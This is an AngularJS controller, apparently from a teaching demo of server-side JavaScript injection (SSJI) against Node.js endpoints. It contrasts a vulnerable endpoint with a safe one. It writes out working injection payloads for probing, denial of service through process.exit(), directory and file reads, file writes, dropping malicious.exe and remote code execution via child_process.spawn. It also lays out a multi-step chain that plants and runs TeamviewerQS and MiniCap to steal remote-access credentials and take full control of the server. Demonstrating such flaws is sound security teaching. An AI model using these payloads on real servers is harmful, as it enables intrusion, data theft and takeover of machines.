'use strict';

angular.module('ssjidemoApp')
  .controller('MainCtrl', function ($scope, $http) {
    $scope.nodeAttacks = [];
    $scope.hijackSteps = [];

    var vulnerableEndpoint = '/api/node/';
    var safeEndpoint = '/api/safenode/';

    $scope.nodeAttacks.push({
      name: 'Probing for SSJI',
      info: 'Probes the server to determine if it has an SSJI vulnerability by injecting a "res.end("success")" ' +
        'command into an API endpoint. If the resulting response contains the "success" text, the attacker has ' +
        'determined that the endpoint is in fact vulnerable to SSJI.',
      attack: function () {
        window.location = vulnerableEndpoint + 'res.end("success")';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'res.end("success")';
      }
    });

    $scope.nodeAttacks.push({
      name: 'Denial of Service',
      info: 'Performs a Denial of Service attack on the Node.js Server by injecting a "process.exit()" command, ' +
        'exiting the server process and preventing the processing of any further requests.',
      attack: function () {
        window.location = vulnerableEndpoint + 'process.exit()';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'process.exit()';
      }
    });

    $scope.nodeAttacks.push({
      name: 'Directory Read',
      info: 'Performs a directory read on the file system of the Node.js Server by injecting a ' +
        '"res.end(require("fs").readdirSync(".").toString())" command, printing out all contents of the current ' +
        'directory and returning the result as the response to the current request.',
      attack: function () {
        window.location = vulnerableEndpoint + 'res.end(require("fs").readdirSync(".").toString())';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'res.end(require("fs").readdirSync(".").toString())';
      }
    });

    $scope.nodeAttacks.push({
      name: 'File Read',
      info: 'Performs a file read on the file system of the Node.js Server by injecting a ' +
        '"res.end(require("fs").readFileSync("secret-file.txt"))" command, printing out contents of secret-file.txt ' +
        'and returning the result as the response to the current request.',
      attack: function () {
        window.location = vulnerableEndpoint + 'res.end(require("fs").readFileSync("secret-file.txt"))';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'res.end(require("fs").readFileSync("secret-file.txt"))';
      }
    });

    $scope.nodeAttacks.push({
      name: 'File Write',
      info: 'Performs a file write on secret-file.txt on the Node.js Server by injecting a ' +
        '"res.end(require("fs").writeFileSync("secret-file.txt", "pwnd!!!" + ' +
        'require("fs").readFileSync("secret-file.txt")))" command, writing "pwnd!!!" in front of the contents of ' +
        'secret-file.txt. This can be verified using the previously demonstrated file read attack.',
      attack: function () {
        window.location = vulnerableEndpoint + 'res.end(require("fs").writeFileSync("secret-file.txt", ' +
          '"pwnd!!!" + require("fs").readFileSync("secret-file.txt")))';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'res.end(require("fs").writeFileSync("secret-file.txt", ' +
          '"pwnd!!!" + require("fs").readFileSync("secret-file.txt")))';
      }
    });

    $scope.nodeAttacks.push({
      name: 'Arbitrary File Creation',
      info: 'Creates a file named malicious.exe on the Node.js Server by injecting a ' +
        '"require("fs").writeFileSync("malicious.exe", "base64binarydata", ' +
        '"base64")" command, writing the base64 encoded content into a file named malicious.exe. ' +
        'This can be verified using the previously demonstrated directory read attack.',
      attack: function () {
        window.location = vulnerableEndpoint + 'require("fs").writeFileSync("malicious.exe", "base64binarydata", ' +
         '"base64")';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'require("fs").writeFileSync("malicious.exe", "base64binarydata", ' +
          '"base64")';
      }
    });

    $scope.nodeAttacks.push({
      name: 'Remote Code Execution',
      info: 'Executes a file named malicious.exe on the Node.js Server by injecting a ' +
        '"require("child_process").spawn("malicious.exe")" command.',
      attack: function () {
        window.location = vulnerableEndpoint + 'require("child_process").spawn("malicious.exe")';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'require("child_process").spawn("malicious.exe")';
      }
    });

    $scope.hijackSteps.push({
      name: 'Step 1 - Injecting the necessary executables',
      info: 'The attack begins by injecting the TeamviewerQS.exe remote access client executable onto the server, ' +
        'as well as the MiniCap.exe screenshot capture program using the Arbitrary File Creation attack shown above. ' +
        'Injecting a full 3MB+ executable is rather time consuming, so we have prepared the executables ahead of time.',
      attack: function () {
      }
    });

    $scope.hijackSteps.push({
      name: 'Step 2 - Execute TeamviewerQS',
      info: 'We then use the Remote Code Execution exploit to execute the TeamviewerQS.exe remote access client.',
      attack: function () {
        window.location = vulnerableEndpoint + 'require("child_process").spawn("TeamviewerQS.exe")';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'require("child_process").spawn("TeamviewerQS.exe")';
      }
    });

    $scope.hijackSteps.push({
      name: 'Step 3 - Execute MiniCap',
      info: 'We proceed to use the Remote Code Execution exploit to execute MiniCap.exe, a screenshot capture ' +
        'program, and save the resulting image as ss.jpg.',
      attack: function () {
        window.location = vulnerableEndpoint + 'require("child_process").spawn("MiniCap.exe", ["-capturescreen", "-save", "ss.jpg"])';
      }, attackSafe: function () {
        window.location = safeEndpoint +  'require("child_process").spawn("MiniCap.exe", ["-capturescreen", "-save", "ss.jpg"])';
      }
    });

    $scope.hijackSteps.push({
      name: 'Step 4 - Read ss.jpg',
      info: 'We access the result of the screenshot capture, ss.jpg, using the File Read exploit to obtain the' +
        'Teamviewer ID and password for the server.',
      attack: function () {
        window.location = vulnerableEndpoint + 'res.end(require("fs").readFileSync("ss.jpg"), "binary")';
      }, attackSafe: function () {
        window.location = safeEndpoint + 'res.end(require("fs").readFileSync("ss.jpg"), "binary")';
      }
    });

    $scope.hijackSteps.push({
      name: 'Step 5 - Connect to server using Teamviewer',
      info: 'Using the Teamviewer ID and password, we can connect to the server machine using the Teamviewer client, ' +
        'gaining full GUI access to the server machine.',
      attack: function () {
      }
    });
  });